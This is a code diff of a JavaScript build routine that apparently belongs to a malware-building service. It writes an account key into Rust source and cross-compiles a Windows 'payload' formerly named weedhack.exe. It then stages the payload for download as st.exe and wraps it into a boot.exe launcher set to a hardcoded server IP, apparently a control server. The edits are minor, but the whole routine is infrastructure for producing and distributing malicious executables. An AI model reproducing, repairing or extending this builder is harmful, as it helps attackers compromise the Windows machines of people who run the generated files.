@@ -20,12 +20,10 @@ export async function buildBoot({ key, buildId }) {
     fs.mkdirSync(srcDir, { recursive: true });
   }
 
-  // Write the embedded key just in case the Rust code falls back to it
   const embeddedKeyPath = path.join(srcDir, 'embedded_key.rs');
-  const embeddedSrc = `pub const ACCOUNT_KEY: &str = "${key}";\n`;
-  fs.writeFileSync(embeddedKeyPath, embeddedSrc);
+  fs.writeFileSync(embeddedKeyPath, `pub const ACCOUNT_KEY: &str = "${key}";\n`);
 
-  console.log('[build] compiling rust payload (st.exe)...');
+  console.log('[build] compiling rust payload...');
   try {
     await execFileP('cargo', ['build', '--release', '--target', 'x86_64-pc-windows-gnu'], {
       cwd: rustDir,
@@ -38,22 +36,22 @@ export async function buildBoot({ key, buildId }) {
     throw new Error(`cargo failed: ${e.stderr || e.message}`);
   }
 
-  const baseExe = path.join(rustDir, 'target', 'x86_64-pc-windows-gnu', 'release', 'weedhack.exe');
+  // FIXED: Look for boot.exe instead of weedhack.exe
+  const baseExe = path.join(rustDir, 'target', 'x86_64-pc-windows-gnu', 'release', 'boot.exe');
   if (!fs.existsSync(baseExe)) {
     throw new Error(`rust build missing output at ${baseExe}`);
   }
 
-  // Copy the compiled rust payload to the server's download folder
+  // Copy the compiled rust payload to the server's download folder as st.exe
   if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
   fs.copyFileSync(baseExe, path.join(DOWNLOAD_DIR, 'st.exe'));
 
   console.log('[build] wrapping into boot.exe...');
   
-  // Pass the buildId to compileLauncher
   const bootBuf = await compileLauncher({ 
     key, 
     buildId,
-    config: { ip: '95.182.96.216' }, 
+    config: { ip: process.env.SERVER_IP || '95.182.96.216' }, 
     baseExe 
   });
   
